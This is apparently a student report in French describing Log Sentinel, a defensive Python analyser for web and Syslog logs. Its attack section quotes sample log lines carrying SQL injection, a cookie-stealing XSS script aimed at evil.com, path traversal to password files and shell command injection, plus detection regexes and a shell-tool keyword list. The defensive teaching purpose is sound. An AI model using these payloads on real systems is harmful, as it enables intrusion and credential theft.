# Analyseur Intelligent de Logs — Blue Team
## Contexte cybersécurité, fondements théoriques et mise en pratique avec Log Sentinel

---

**Auteur :** NAOMIE NGWIDJOMBY MOUSSAVOU
**Parcours :** Master 1 Cybersécurité
**Module :** Python
**Date :** Mars 2026
**Consigne :** *Analyseur intelligent de logs (Apache, Nginx, Syslog) avec détection d'attaques et génération de rapport*

---

## Table des matières

1. [Introduction générale](#1-introduction-générale)
2. [Problématique](#2-problématique)
3. [Blue Team et SOC — Fondements](#3-blue-team-et-soc--fondements)
4. [Les formats de logs supportés](#4-les-formats-de-logs-supportés)
5. [Importance des logs en cybersécurité](#5-importance-des-logs-en-cybersécurité)
6. [Types d'attaques détectées — Explication détaillée](#6-types-dattaques-détectées--explication-détaillée)
7. [Méthodologie de détection](#7-méthodologie-de-détection)
8. [Valeur ajoutée Blue Team](#8-valeur-ajoutée-blue-team)
9. [Limites et perspectives](#9-limites-et-perspectives)
10. [Conclusion](#10-conclusion)
11. [Références](#11-références)

---

## 1. Introduction générale

### 1.1 Contexte des cybermenaces actuelles

Le paysage des menaces informatiques a connu une évolution considérable au cours de la dernière décennie. Selon le rapport annuel de l'Agence de l'Union européenne pour la cybersécurité (ENISA), les attaques contre les systèmes d'information ont augmenté de manière exponentielle, tant en volume qu'en sophistication. En 2024, les incidents de sécurité liés à des intrusions sur des serveurs web représentaient une part significative des violations de données signalées dans le monde entier.

Dans ce contexte, les organisations sont confrontées à un impératif de surveillance permanente de leurs systèmes. Les journaux d'événements — communément appelés *logs* — constituent la mémoire technique des systèmes d'information. Ils enregistrent de manière chronologique l'ensemble des événements survenant sur un système : accès utilisateurs, erreurs applicatives, tentatives d'intrusion, comportements anormaux et transactions réseau. Ces traces numériques sont à la fois une ressource inestimable pour les équipes de défense et une cible pour les attaquants qui cherchent à effacer leurs traces.

La multiplication des surfaces d'attaque — applications web, interfaces API, services cloud, objets connectés — engendre une production de logs dont le volume dépasse largement les capacités d'analyse humaine. Un serveur web à trafic modéré peut générer plusieurs millions de lignes de logs par jour. Face à cette réalité, l'automatisation de l'analyse devient non seulement souhaitable, mais indispensable.

### 1.2 Rôle des logs dans la cybersécurité

Les logs occupent une position centrale dans la chaîne de détection et de réponse aux incidents de sécurité. Le NIST (National Institute of Standards and Technology) définit dans sa publication spéciale SP 800-92 (*Guide to Computer Security Log Management*) les journaux d'événements comme « des enregistrements d'événements survenant dans les systèmes et réseaux d'une organisation », soulignant leur rôle fondamental dans la gestion de la sécurité.

Concrètement, les logs permettent de :

- **Détecter les incidents en cours** : une série d'échecs d'authentification sur un même compte signale une attaque par force brute ;
- **Reconstruire la chronologie d'une intrusion** : lors d'une investigation forensique, les logs permettent de retracer les actions d'un attaquant pas à pas ;
- **Démontrer la conformité réglementaire** : le RGPD, la norme ISO 27001 et d'autres référentiels exigent la traçabilité des accès aux données sensibles ;
- **Anticiper de futures attaques** : l'analyse de tendances sur des données historiques permet d'identifier des patterns d'attaque récurrents.

### 1.3 Positionnement Blue Team vs Red Team

La cybersécurité opérationnelle s'organise traditionnellement autour de deux équipes aux rôles complémentaires et antagonistes :

La **Red Team** adopte une posture offensive. Elle simule les techniques d'attaquants réels — reconnaissance, exploitation, pivotement latéral, exfiltration — dans le but d'identifier les vulnérabilités d'un système avant qu'un véritable attaquant ne les découvre. Ses outils incluent des frameworks comme Metasploit, Burp Suite ou Cobalt Strike.

La **Blue Team**, à l'inverse, assume une posture défensive. Son rôle est de surveiller, détecter, analyser et répondre aux incidents de sécurité. Elle opère en continu au sein des Security Operations Centers (SOC) et s'appuie sur des outils d'analyse de logs, de détection d'intrusion et de gestion des événements de sécurité (SIEM). Le présent projet s'inscrit intégralement dans cette logique défensive.

Il existe également des approches hybrides telles que la **Purple Team**, qui favorise la collaboration entre les deux équipes pour améliorer à la fois les capacités offensives et défensives de l'organisation.

### 1.4 Présentation du projet Log Sentinel

Log Sentinel est un outil d'analyse intelligente de journaux de sécurité développé en Python dans le cadre du module *Python* du Master 1 Cybersécurité. Il se positionne comme un analyseur de logs à vocation Blue Team, capable de traiter automatiquement des fichiers de logs issus des serveurs web Apache et Nginx, ainsi que des journaux système au format Syslog.

L'outil propose deux interfaces complémentaires :

- Une **interface en ligne de commande (CLI)** s'appuyant sur la bibliothèque `rich` pour un rendu enrichi dans le terminal ;
- Une **interface web interactive** développée avec le framework Streamlit, permettant une exploration visuelle des résultats.

Log Sentinel couvre l'intégralité du pipeline d'analyse : chargement du fichier, détection automatique du format, parsing structuré des entrées, détection multi-vecteurs d'attaques, enrichissement OSINT par géolocalisation des adresses IP, calcul d'un score de risque global et génération d'un rapport HTML autonome.

---

## 2. Problématique

### 2.1 Difficultés de l'analyse manuelle de logs

L'analyse manuelle des journaux de sécurité se heurte à trois obstacles majeurs qui en limitent l'efficacité opérationnelle.

**Le volume.** Un serveur web exposé sur Internet peut générer plusieurs millions de requêtes quotidiennes, chacune correspondant à une ligne de log. Dans un contexte d'attaque active — notamment lors d'un scan de masse ou d'une campagne de brute-force —, ce volume peut croître de manière brutale et soudaine. Aucun analyste humain ne peut raisonnablement traiter ce flux en temps réel.

**L'hétérogénéité.** Les formats de logs varient selon les technologies employées. Un serveur Apache n'utilise pas le même format qu'un serveur Nginx, lui-même différent des journaux système Syslog ou des logs applicatifs personnalisés. Cette hétérogénéité oblige à maîtriser une multiplicité de syntaxes et rend la corrélation entre sources difficile.

**La fatigue analytique.** L'analyse répétitive de données textuelles denses expose l'analyste à une fatigue cognitive qui augmente le risque d'erreur. Des attaques sophistiquées, fragmentées sur de longues périodes ou dissimulées dans un volume de trafic légitime, peuvent passer inaperçues lors d'une revue manuelle.

### 2.2 Besoin d'automatisation

Face à ces contraintes, l'automatisation de l'analyse de logs s'impose comme une nécessité opérationnelle. Les avantages sont multiples : traitement rapide de volumes importants, application cohérente et exhaustive de règles de détection, disponibilité permanente sans fatigue, et capacité à corréler des événements sur des plages temporelles larges.

L'automatisation ne vise pas à remplacer l'analyste humain, mais à le décharger des tâches répétitives à faible valeur ajoutée pour lui permettre de se concentrer sur l'investigation approfondie des alertes significatives.

### 2.3 Question de recherche

> **Comment concevoir, en Python, un outil modulaire et extensible d'analyse automatisée de logs de sécurité — couvrant les formats Apache, Nginx et Syslog — permettant de détecter des comportements malveillants par combinaison de signatures et de seuils comportementaux, tout en restant accessible à un analyste SOC junior sans infrastructure SIEM dédiée ?**

---

## 3. Blue Team et SOC — Fondements

### 3.1 Définition de la Blue Team

La Blue Team désigne, dans le vocabulaire de la cybersécurité opérationnelle, l'équipe responsable de la défense des systèmes d'information d'une organisation. Son périmètre d'action couvre la surveillance des réseaux et systèmes, la détection des incidents, la réponse aux attaques et la remédiation des vulnérabilités identifiées.

La Blue Team s'appuie sur le principe de **défense en profondeur** (*defense in depth*), qui consiste à superposer plusieurs couches de protection de sorte qu'un attaquant ayant franchi un premier obstacle se heurte immédiatement à un suivant. L'analyse de logs constitue l'une de ces couches, opérant en aval des mécanismes préventifs (pare-feu, contrôles d'accès) pour détecter les menaces ayant réussi à les contourner.

### 3.2 Rôle d'un analyste SOC

Un **Security Operations Center (SOC)** est une cellule dédiée à la surveillance en temps réel de la sécurité informatique d'une organisation. L'analyste SOC — en particulier de niveau 1 ou 2 — est le professionnel chargé d'examiner les alertes remontées par les outils de surveillance, d'en évaluer la pertinence (triage) et de les escalader ou de les traiter selon leur criticité.

Les responsabilités typiques d'un analyste SOC incluent :

- La **surveillance en temps réel** des tableaux de bord SIEM et des flux d'alertes ;
- Le **triage des alertes** : distinguer les vrais positifs des faux positifs ;
- L'**investigation initiale** : consulter les logs sources pour reconstituer le contexte d'une alerte ;
- La **documentation** des incidents : renseigner les tickets dans un système de gestion des incidents ;
- L'**escalade** vers les équipes de niveau 2 ou 3 pour les incidents complexes.

Log Sentinel s'adresse précisément à ce profil : il fournit à l'analyste SOC une première couche d'analyse automatisée qui réduit le travail de triage manuel.

### 3.3 Outils Blue Team

L'écosystème Blue Team repose sur un ensemble d'outils spécialisés :

| Catégorie | Exemples | Rôle |
|---|---|---|
| **SIEM** | Splunk, IBM QRadar, Microsoft Sentinel | Agrégation, corrélation et visualisation des événements de sécurité |
| **IDS/IPS** | Snort, Suricata, Zeek | Détection et prévention des intrusions réseau |
| **Analyseurs de logs** | ELK Stack, Graylog, Log Sentinel | Parsing, recherche et analyse de journaux |
| **EDR** | CrowdStrike Falcon, SentinelOne | Détection et réponse sur les endpoints |
| **Threat Intelligence** | MISP, OpenCTI | Partage et enrichissement de renseignements sur les menaces |
| **SOAR** | Palo Alto XSOAR, Splunk SOAR | Orchestration et automatisation de la réponse aux incidents |

### 3.4 Position de Log Sentinel dans cet écosystème

Log Sentinel se positionne dans la catégorie des **analyseurs de logs légers**, aux côtés d'outils comme GoAccess ou AWStats pour l'aspect statistique, mais avec une dimension sécuritaire plus poussée. Il n'ambitionne pas de remplacer un SIEM d'entreprise, mais de fournir une solution autonome, sans dépendance à une infrastructure lourde, adaptée à :

- Des environnements de petite taille (PME, associations, projets personnels) ;
- Des contextes pédagogiques et de formation en cybersécurité ;
- Une analyse *post-mortem* ponctuelle sur des fichiers de logs archivés ;
- Un premier niveau de triage avant investigation manuelle approfondie.

---

## 4. Les formats de logs supportés

### 4.1 Apache Combined Log Format

**Définition.** Le serveur HTTP Apache est l'un des serveurs web les plus répandus dans le monde. Il utilise par défaut le format **Combined Log Format**, une extension du Common Log Format qui inclut des informations sur le référent HTTP et le User-Agent du client.

**Exemple de ligne :**

```
192.168.1.42 - frank [10/Oct/2023:13:55:36 -0700] "GET /admin/login.php HTTP/1.1" 200 2326 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

**Champs extraits par Log Sentinel :**

| Champ | Valeur dans l'exemple | Description |
|---|---|---|
| `ip` | `192.168.1.42` | Adresse IP du client |
| `user` | `frank` | Identifiant authentifié (ou `-`) |
| `timestamp` | `10/Oct/2023:13:55:36 -0700` | Horodatage de la requête |
| `method` | `GET` | Méthode HTTP |
| `uri` | `/admin/login.php` | Ressource demandée |
| `protocol` | `HTTP/1.1` | Version du protocole |
| `status` | `200` | Code de réponse HTTP |
| `size` | `2326` | Taille de la réponse en octets |
| `referer` | `http://example.com/` | Page d'origine de la requête |
| `user_agent` | `Mozilla/5.0 ...` | Navigateur ou outil client |

**Expression régulière de détection du format :**
La présence des guillemets autour de la requête HTTP, combinée au pattern `IP - identifiant [date]`, caractérise ce format de manière unique.

---

📸 **CAPTURE D'ÉCRAN** — *Parsing d'une ligne de log Apache dans le terminal : affichage des champs extraits (IP, méthode, URI, status, User-Agent) via l'interface Rich de Log Sentinel*
> *(Insérer ici la capture)*

---

### 4.2 Nginx Access Log Format

**Définition.** Nginx est un serveur web et reverse proxy performant, très utilisé pour les architectures à haute disponibilité. Son format de log par défaut est structurellement proche du Combined Log Format d'Apache, mais il présente des différences subtiles de syntaxe, notamment dans l'encodage du timestamp.

**Exemple de ligne :**

```
10.0.0.5 - - [28/Mar/2026:09:12:05 +0000] "POST /api/users HTTP/1.1" 401 153 "-" "python-requests/2.28.0"
```

**Champs extraits :**
Les champs sont identiques à ceux d'Apache (ip, user, timestamp, method, uri, protocol, status, size, referer, user_agent). Log Sentinel applique la même expression régulière Combined Log Format pour les deux formats, en s'appuyant sur l'heuristique de détection du format pour les distinguer lors du chargement.

**Particularités notables :**
- Nginx peut être configuré pour logger des champs supplémentaires (temps de réponse, upstream address, etc.) selon les besoins du déploiement ;
- Le champ User-Agent `python-requests/2.28.0` dans l'exemple est un indicateur fort d'activité automatisée.

### 4.3 Syslog (RFC 5424 / format traditionnel BSD)

**Définition.** Syslog est le format de journalisation standard des systèmes Unix/Linux, défini par les RFC 3164 (format BSD traditionnel) et RFC 5424 (format structuré moderne). Il agrège les événements de l'ensemble des composants du système : authentification (`auth.log`), noyau (`kern.log`), services réseau, applications, etc.

**Exemple de ligne (format BSD) :**

```
Mar 28 09:15:22 webserver01 sshd[1234]: Failed password for root from 203.0.113.42 port 52341 ssh2
```

**Champs extraits par Log Sentinel :**

| Champ | Valeur dans l'exemple | Description |
|---|---|---|
| `timestamp` | `Mar 28 09:15:22` | Horodatage |
| `host` | `webserver01` | Nom d'hôte source (mappé en `ip` pour l'analyse) |
| `process` | `sshd[1234]` | Processus émetteur et PID |
| `message` | `Failed password for root from 203.0.113.42 port 52341 ssh2` | Corps du message (mappé en `uri` pour l'analyse) |

**Adaptation dans Log Sentinel :** les logs Syslog ne contiennent pas de champs HTTP. Log Sentinel mappe le champ `host` à `ip` et le champ `message` à `uri` pour uniformiser le traitement avec les autres formats et permettre l'application des détecteurs sur le contenu du message.

---

## 5. Importance des logs en cybersécurité

### 5.1 Détection d'incidents

La détection d'incidents de sécurité repose en grande partie sur l'analyse des logs. Le modèle **PDCA** (Plan-Do-Check-Act) appliqué à la sécurité des systèmes d'information place la surveillance — dont l'analyse de logs est un pilier — au cœur du cycle d'amélioration continue.

Le NIST Cybersecurity Framework (CSF) identifie la fonction *Detect* comme l'une des cinq fonctions fondamentales de la cybersécurité. Cette fonction inclut explicitement la mise en place de mécanismes de surveillance des événements et de détection des anomalies, ce qui correspond directement à l'objectif de Log Sentinel.

### 5.2 Forensique numérique

La **forensique numérique** (ou informatique légale) désigne la discipline qui consiste à collecter, préserver et analyser des preuves numériques dans le cadre d'une investigation. Les logs constituent une source primaire de preuves numériques.

Lors d'une investigation post-incident, les logs permettent de répondre aux questions fondamentales :
- **Quand** l'incident s'est-il produit ? (horodatage des événements)
- **D'où** venait l'attaque ? (adresses IP sources, User-Agents)
- **Quelles ressources** ont été accédées ou compromises ? (URIs, fichiers)
- **Quel chemin** l'attaquant a-t-il emprunté ? (séquence chronologique des requêtes)

La préservation de l'intégrité des logs est à cet égard cruciale : toute modification non autorisée d'un fichier de log peut rendre les preuves irrecevables. C'est pourquoi les bonnes pratiques recommandent de centraliser les logs sur des serveurs dédiés dès leur émission (syslog distant, SIEM).

### 5.3 Conformité réglementaire

Plusieurs référentiels réglementaires et normatifs imposent explicitement la collecte et la conservation des logs :

- **RGPD (Règlement Général sur la Protection des Données) — UE 2016/679** : l'article 32 exige la mise en place de « mesures techniques et organisationnelles appropriées » pour assurer la sécurité des données, incluant la traçabilité des accès ;
- **ISO/IEC 27001:2022** : le contrôle A.8.15 (*Logging*) prescrit la production, la conservation et la revue régulière des journaux d'événements ;
- **PCI-DSS v4.0** : la norme de sécurité des données de l'industrie des cartes de paiement impose une rétention minimale de 12 mois pour les logs et une revue quotidienne ;
- **NIST SP 800-92** (*Guide to Computer Security Log Management*) : ce guide de référence détaille les meilleures pratiques pour la gestion des logs dans les organisations gouvernementales et privées.

### 5.4 Traçabilité et non-répudiation

La traçabilité désigne la capacité à retracer de manière fiable l'ensemble des actions effectuées sur un système. Elle constitue un principe fondamental de la sécurité de l'information, au même titre que la confidentialité, l'intégrité et la disponibilité (triade CIA).

La non-répudiation, concept juridiquement chargé, désigne l'impossibilité pour un acteur de nier avoir effectué une action lorsque des preuves numériques fiables en attestent. Les logs horodatés et signés numériquement constituent la base technique de la non-répudiation dans les systèmes informatiques modernes.

---

## 6. Types d'attaques détectées — Explication détaillée

### 6.1 Attaque par Force Brute (Brute-Force)

**Définition.**
L'attaque par force brute est une technique qui consiste à tester de manière systématique et automatisée un grand nombre de combinaisons d'identifiants et de mots de passe jusqu'à trouver les credentials corrects. Elle repose sur la puissance de calcul plutôt que sur une vulnérabilité applicative spécifique. Les variantes incluent l'attaque par dictionnaire (*dictionary attack*), qui utilise des listes de mots de passe courants, et le *credential stuffing*, qui réutilise des identifiants issus de fuites de données passées.

**Mécanisme d'attaque.**
Un attaquant utilise un outil automatisé (Hydra, Medusa, Burp Intruder) qui envoie des centaines ou des milliers de requêtes d'authentification par minute vers une interface de connexion. Chaque tentative échouée génère une réponse HTTP avec un code d'erreur (401 Unauthorized ou 403 Forbidden). La détection repose sur le constat qu'un utilisateur légitime génère rarement plus de quelques échecs de connexion successifs.

**Exemple dans un log Apache :**

```
203.0.113.7 - - [28/Mar/2026:02:14:01 +0000] "POST /wp-login.php HTTP/1.1" 401 1856 "-" "Hydra/9.0"
203.0.113.7 - - [28/Mar/2026:02:14:02 +0000] "POST /wp-login.php HTTP/1.1" 401 1856 "-" "Hydra/9.0"
203.0.113.7 - - [28/Mar/2026:02:14:03 +0000] "POST /wp-login.php HTTP/1.1" 401 1856 "-" "Hydra/9.0"
```

**Comment Log Sentinel la détecte.**
Log Sentinel agrège les codes de statut HTTP 401 et 403 par adresse IP source. Lorsqu'une IP dépasse le seuil configurable `--bf-threshold` (valeur par défaut : 10 tentatives), une alerte de type `brute_force` est levée. Ce seuil est intentionnellement paramétrable pour s'adapter à des contextes différents (environnement de production, environnement de test).

**Référence :** OWASP Testing Guide — OTG-AUTHN-003 (*Testing for Weak Lock Out Mechanism*) ; MITRE ATT&CK — T1110 (*Brute Force*).

---

### 6.2 Injection SQL (SQL Injection)

**Définition.**
L'injection SQL (SQLi) est une technique d'attaque qui consiste à insérer ou manipuler des requêtes SQL dans les paramètres d'entrée d'une application web, dans le but d'interagir de manière non autorisée avec la base de données sous-jacente. Elle figure systématiquement parmi les premières vulnérabilités du classement OWASP Top 10 depuis sa première publication en 2003.

**Mécanisme d'attaque.**
Lorsqu'une application construit ses requêtes SQL par concaténation directe des entrées utilisateur, un attaquant peut injecter des fragments SQL malveillants. Par exemple, si un formulaire de connexion génère la requête `SELECT * FROM users WHERE username='$input'`, un attaquant saisissant `' OR '1'='1` transforme la requête en `SELECT * FROM users WHERE username='' OR '1'='1'`, qui retourne tous les utilisateurs.

Les objectifs d'une injection SQL peuvent inclure : l'authentification contournée (*authentication bypass*), l'extraction de données sensibles (*data exfiltration*), la modification ou suppression de données, voire l'exécution de commandes système dans les cas les plus graves (via `xp_cmdshell` sous SQL Server).

**Exemple dans un log :**

```
45.33.32.156 - - [28/Mar/2026:10:22:15 +0000] "GET /search?q=' OR 1=1-- HTTP/1.1" 200 4521 "-" "sqlmap/1.7"
45.33.32.156 - - [28/Mar/2026:10:22:16 +0000] "GET /user?id=1 UNION SELECT username,password,3 FROM users-- HTTP/1.1" 500 1024 "-" "sqlmap/1.7"
```

**Comment Log Sentinel la détecte.**
Log Sentinel applique une expression régulière sur le champ `uri` à la recherche de patterns caractéristiques des injections SQL : mots-clés `UNION`, `SELECT`, `INSERT`, `DROP`, `--`, `OR 1=1`, `SLEEP()`, `BENCHMARK()`, apostrophes de fermeture suivies de conditions booléennes, encodages URL `%27` (apostrophe) et `%22` (guillemet double).

**Pattern regex (simplifié) :**
```python
r"(?i)(union\s+select|or\s+1\s*=\s*1|drop\s+table|insert\s+into|'\s*--|\bsleep\s*\(|\bbenchmark\s*\(|%27|%22)"
```

**Référence :** OWASP Top 10 — A03:2021 Injection ; CWE-89 (*Improper Neutralization of Special Elements used in an SQL Command*).

---

### 6.3 Cross-Site Scripting (XSS)

**Définition.**
Le Cross-Site Scripting (XSS) est une classe de vulnérabilités qui permettent à un attaquant d'injecter du code JavaScript (ou d'autres scripts côté client) dans des pages web consultées par d'autres utilisateurs. Contrairement aux injections SQL qui ciblent le serveur, le XSS cible le navigateur des victimes.

**Mécanisme d'attaque.**
Il existe trois variantes principales :
- **XSS réfléchi (*Reflected XSS*)** : le script malveillant est inclus dans la requête HTTP et directement renvoyé dans la réponse du serveur sans être stocké ;
- **XSS persistant (*Stored XSS*)** : le script est stocké en base de données et servi à tous les utilisateurs consultant la ressource infectée ;
- **XSS basé sur le DOM (*DOM-based XSS*)** : le script manipule le Document Object Model du navigateur sans nécessiter d'interaction avec le serveur.

Les conséquences incluent le vol de cookies de session, la redirection vers des sites de phishing, l'exécution d'actions à l'insu de la victime ou le keylogging dans le navigateur.

**Exemple dans un log :**

```
92.18.54.201 - - [28/Mar/2026:11:05:33 +0000] "GET /comment?text=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200 3142 "-" "Mozilla/5.0"
```

**Comment Log Sentinel la détecte.**
La détection cible les patterns HTML/JavaScript caractéristiques dans le champ `uri` : balises `<script>`, gestionnaires d'événements (`onload=`, `onerror=`, `onmouseover=`), fonctions JavaScript dangereuses (`eval(`, `document.cookie`, `window.location`), ainsi que leurs équivalents encodés en URL (`%3Cscript%3E`, `%3C`, `%3E`).

**Référence :** OWASP Top 10 — A03:2021 Injection ; CWE-79 (*Improper Neutralization of Input During Web Page Generation*).

---

### 6.4 Path Traversal (Traversée de répertoire)

**Définition.**
Le Path Traversal, également connu sous le nom de *Directory Traversal* ou *dot-dot-slash attack*, est une vulnérabilité permettant à un attaquant d'accéder à des fichiers situés en dehors du répertoire racine du serveur web, en manipulant les chemins de fichiers via des séquences `../`.

**Mécanisme d'attaque.**
Un serveur web vulnérable qui inclut des fichiers en fonction d'un paramètre utilisateur — par exemple `/download?file=rapport.pdf` — peut être trompé par une requête `/download?file=../../../etc/passwd`. Si l'application ne valide pas correctement l'entrée, le serveur tentera d'accéder au fichier `/etc/passwd`, révélant potentiellement des informations critiques sur le système.

**Exemple dans un log :**

```
198.51.100.23 - - [28/Mar/2026:14:30:02 +0000] "GET /include?page=../../../../etc/passwd HTTP/1.1" 200 1523 "-" "curl/7.88.1"
198.51.100.23 - - [28/Mar/2026:14:30:03 +0000] "GET /include?page=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 512 "-" "curl/7.88.1"
```

**Comment Log Sentinel la détecte.**
Log Sentinel recherche dans l'URI les séquences `../`, `..\`, ainsi que leurs encodages URL (`%2e%2e%2f`, `%2e%2e/`, `.%2e/`) et doubles encodages (`%252e`). La combinaison de plusieurs séquences consécutives renforce la probabilité de tentative malveillante.

**Référence :** OWASP Testing Guide — OTG-AUTHZ-001 ; CWE-22 (*Improper Limitation of a Pathname to a Restricted Directory*).

---

### 6.5 Injection de commande (Command Injection)

**Définition.**
L'injection de commande est une vulnérabilité critique permettant à un attaquant d'exécuter des commandes arbitraires sur le système d'exploitation hébergeant l'application vulnérable. Elle survient lorsqu'une application transmet des données non validées à un interpréteur de commandes système.

**Mécanisme d'attaque.**
Si une application web exécute des commandes système en intégrant des entrées utilisateur — par exemple un outil de ping qui exécute `ping -c 1 $user_input` — un attaquant peut injecter `; whoami` ou `| cat /etc/passwd` pour enchaîner des commandes supplémentaires. Les caractères de contrôle clés sont `;`, `|`, `&`, `$()` et les backticks.

**Exemple dans un log :**

```
185.220.101.42 - - [28/Mar/2026:16:45:11 +0000] "GET /ping?host=8.8.8.8;cat+/etc/passwd HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
185.220.101.42 - - [28/Mar/2026:16:45:12 +0000] "GET /tools?cmd=id|whoami HTTP/1.1" 500 512 "-" "Mozilla/5.0"
```

**Comment Log Sentinel la détecte.**
Le détecteur cible les métacaractères shell dans l'URI (`|`, `;`, `&&`, `||`), les commandes Unix dangereuses (`wget`, `curl`, `nc`, `bash`, `sh`, `id`, `whoami`, `uname`) et les tentatives de redirection de sortie (`>`, `>>`, `2>`).

**Référence :** OWASP Top 10 — A03:2021 Injection ; CWE-78 (*Improper Neutralization of Special Elements used in an OS Command*).

---

### 6.6 Accès aux fichiers sensibles

**Définition.**
Cette catégorie regroupe les tentatives d'accès à des fichiers de configuration, de secrets ou de métadonnées qui ne devraient jamais être exposés publiquement via un serveur web. Leur exposition peut compromettre l'ensemble de l'infrastructure.

**Mécanisme d'attaque.**
Un attaquant procède souvent par reconnaissance en testant l'existence de fichiers connus. Des outils comme `gobuster`, `dirbuster` ou `ffuf` automatisent cette exploration en s'appuyant sur des listes de chemins courants (wordlists). La découverte d'un fichier `.env` exposant des clés API ou des mots de passe de base de données peut constituer à elle seule une violation de données majeure.

**Fichiers ciblés typiques :**

| Fichier | Risque |
|---|---|
| `.env` | Variables d'environnement : mots de passe, clés API |
| `.git/config` | Informations sur le dépôt Git, potentiellement identifiants |
| `wp-config.php` | Credentials base de données WordPress |
| `/etc/passwd` | Liste des comptes utilisateurs Unix |
| `/etc/shadow` | Hachages des mots de passe Unix |
| `web.config` | Configuration IIS (Windows), potentiellement secrets |
| `phpinfo.php` | Informations de configuration PHP détaillées |
| `backup.sql`, `.bak` | Sauvegardes pouvant contenir des données sensibles |

**Exemple dans un log :**

```
77.88.55.60 - - [28/Mar/2026:08:11:04 +0000] "GET /.env HTTP/1.1" 200 487 "-" "Go-http-client/1.1"
77.88.55.60 - - [28/Mar/2026:08:11:05 +0000] "GET /.git/config HTTP/1.1" 403 209 "-" "Go-http-client/1.1"
```

**Comment Log Sentinel la détecte.**
L'outil maintient une liste de patterns correspondant aux chemins de fichiers sensibles connus et génère une alerte `sensitive_file` dès qu'une correspondance est trouvée dans l'URI, quel que soit le code de statut de la réponse (une réponse 403 indique que le fichier existe mais est protégé, ce qui peut quand même alerter sur la reconnaissance en cours).

---

### 6.7 User-Agent malveillant

**Définition.**
Le champ User-Agent d'une requête HTTP identifie le logiciel effectuant la requête. Si les navigateurs légitimes présentent des User-Agents reconnaissables (Mozilla, Chrome, Safari), les outils d'attaque automatisés laissent fréquemment des signatures caractéristiques dans ce champ.

**Mécanisme d'attaque.**
Les outils de scan, d'exploitation et de fuzzing incluent souvent leur nom dans le User-Agent par défaut. Certains attaquants modifient ce champ pour se faire passer pour un navigateur légitime (*spoofing*), mais beaucoup oublient de le faire ou utilisent des valeurs par défaut.

**User-Agents malveillants courants :**

| Outil | User-Agent type | Usage |
|---|---|---|
| sqlmap | `sqlmap/1.7` | Détection et exploitation SQLi |
| Nikto | `Nikto/2.1.6` | Scanner de vulnérabilités web |
| Nmap | `Nmap Scripting Engine` | Scanner de ports et de services |
| Masscan | `masscan/1.3` | Scanner de masse très rapide |
| Hydra | `Hydra/9.0` | Attaque brute-force |
| DirBuster | `DirBuster-1.0-RC1` | Énumération de répertoires |
| Python-requests | `python-requests/2.x` | Souvent utilisé pour des scripts d'exploitation |

**Exemple dans un log :**

```
45.55.44.33 - - [28/Mar/2026:19:22:01 +0000] "GET /login HTTP/1.1" 200 3421 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
```

**Comment Log Sentinel la détecte.**
Une liste de patterns regex couvre les noms d'outils connus dans le champ `user_agent`. Cette détection est appliquée uniquement sur ce champ spécifique, contrairement aux autres détecteurs qui opèrent sur l'URI.

---

### 6.8 Scan de ressources (Reconnaissance)

**Définition.**
Le scan de ressources désigne une phase de **reconnaissance active** au cours de laquelle un attaquant explore méthodiquement les URIs disponibles sur un serveur web. L'objectif est de cartographier la surface d'attaque : identifier les pages d'administration, les fichiers de configuration exposés, les technologies utilisées et les points d'entrée potentiels.

**Mécanisme d'attaque.**
Les outils de type *directory brute-forcer* (gobuster, ffuf, dirbuster, feroxbuster) envoient des requêtes vers des centaines ou milliers d'URIs en très peu de temps, en s'appuyant sur des wordlists de chemins courants. La majorité de ces requêtes aboutit à des réponses 404 (ressource non trouvée), ce qui constitue la signature comportementale principale d'un scan.

**Exemple dans un log :**

```
203.0.113.99 - - [28/Mar/2026:22:01:01 +0000] "GET /admin HTTP/1.1" 404 196 "-" "gobuster/3.6"
203.0.113.99 - - [28/Mar/2026:22:01:01 +0000] "GET /administrator HTTP/1.1" 404 196 "-" "gobuster/3.6"
203.0.113.99 - - [28/Mar/2026:22:01:02 +0000] "GET /wp-admin HTTP/1.1" 404 196 "-" "gobuster/3.6"
203.0.113.99 - - [28/Mar/2026:22:01:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 196 "-" "gobuster/3.6"
```

**Comment Log Sentinel la détecte.**
La détection combine deux critères, appliqués par adresse IP source :
1. **Seuil volumétrique** : le nombre d'URIs distinctes accédées par l'IP dépasse `--scan-threshold` (valeur par défaut : 20) ;
2. **Taux d'erreur 404** : plus de 50 % des requêtes de cette IP retournent un code 404.

La conjonction de ces deux conditions distingue un scanner d'un utilisateur légitimement actif sur le site.

---

📸 **CAPTURE D'ÉCRAN** — *Tableau des alertes dans l'interface Streamlit : liste des attaques détectées avec type, IP source, URI concernée et niveau de sévérité*
> *(Insérer ici la capture)*

---

📸 **CAPTURE D'ÉCRAN** — *Section "Types d'attaques" du rapport HTML généré par Log Sentinel : tableau récapitulatif des alertes groupées par catégorie*
> *(Insérer ici la capture)*

---

## 7. Méthodologie de détection

### 7.1 Détection par signature (approche basée sur les patterns)

La détection par signature est l'approche la plus directe : elle consiste à comparer le contenu de chaque entrée de log avec un ensemble de **patterns prédéfinis**, représentant des indicateurs connus de comportement malveillant. Dans Log Sentinel, ces patterns sont implémentés comme des **expressions régulières Python précompilées**, regroupées dans le dictionnaire `ATTACK_PATTERNS`.

**Avantages :**
- Précision élevée sur les attaques connues et bien documentées ;
- Absence de faux positifs pour des patterns très spécifiques ;
- Traitement rapide grâce à la précompilation des regex.

**Limites :**
- Incapacité à détecter des attaques inconnues (*zero-day*) ou fortement obfusquées ;
- Nécessité de maintenance régulière pour couvrir de nouveaux vecteurs d'attaque ;
- Sensibilité aux contournements (encodage Unicode, double encodage URL, fragmentation des requêtes).

**Exemple de pattern Log Sentinel :**

```python
ATTACK_PATTERNS = {
    "sql_injection": re.compile(
        r"(?i)(union\s+select|or\s+1\s*=\s*1|drop\s+table|'\s*--|\bsleep\s*\()",
        re.IGNORECASE
    ),
    "xss": re.compile(
        r"(?i)(<script|javascript:|onerror=|onload=|eval\(|document\.cookie)",
        re.IGNORECASE
    ),
    # ...
}
```

### 7.2 Détection comportementale (approche par seuils)

La détection comportementale ne s'intéresse pas au contenu individuel de chaque requête, mais aux **tendances statistiques** dans le comportement des adresses IP sources. Cette approche permet de détecter des attaques qui, prises individuellement, ne contiennent aucun pattern malveillant évident.

Log Sentinel implémente deux détecteurs comportementaux :

**Détecteur de brute-force.**
